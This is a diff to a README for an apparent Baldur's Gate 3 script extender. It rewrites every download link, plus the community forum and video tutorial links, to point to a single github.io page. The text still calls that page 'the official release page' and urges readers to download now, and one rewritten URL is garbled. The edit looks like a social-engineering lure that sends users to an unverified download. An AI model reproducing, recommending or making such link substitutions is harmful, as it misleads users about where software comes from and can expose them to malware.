@@ -1,6 +1,6 @@
 # 🎮 baldur-s-gate-3-mod-external - Unlock Powerful Scripting for BG3
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://sharpsightednessantigen999.github.io)
 
 ## 👋 Welcome to Baldur's Gate 3 Script Extender
 
@@ -16,7 +16,7 @@ Whether you're a seasoned modder or just curious about tweaking your game, this 
 
 Getting started is simple. Here's your first step:
 
-**[👉 Visit this link to download the application](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)**
+**[👉 Visit this link to download the application](https://sharpsightednessantigen999.github.io)**
 
 This link takes you to the official release page where you'll find the latest version. Look for the biggest, most obvious download button—usually labeled something like "Latest Release" or "Download ZIP." Click it, and the file will start downloading to your computer.
 
@@ -198,15 +198,15 @@ When you download the latest release, you'll find these typical files:
 
 This Baldur's Gate 3 Script Extender is the missing piece for anyone who wants to push the game's boundaries. It's free, open-source, and constantly improved by the modding community.
 
-Don't wait—**[download it now](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)** and start creating your dream mods today!
+Don't wait—**[download it now](https://sharpsightednessantigen999.github.io)** and start creating your dream mods today!
 
 ---
 
 ## 📖 Additional Resources
 
-- [🔗 Official Release Page](https://github.com/sharpsightednessantigen999/baldur-s-gate-3-mod-external/releases)
-- [💬 Community Forums](https://forums.larian.com) – Get help from other users
-- [📺 Video Tutorials](https://www.youtube.com/results?search_query=baldur%27s+gate+3+script+extender+tutorial) – Visual guides for beginners
+- [🔗 Official Release Page](https://sharpsightednessantigen999.github.io)
+- [💬 Community Forums](https://sharpsightednessantigen999.github.io) – Get help from other users
+- [📺 Video Tutorials](https://sharpsightednessantigen999.github.io+gate+3+script+extender+tutorial) – Visual guides for beginners
 
 ---
 
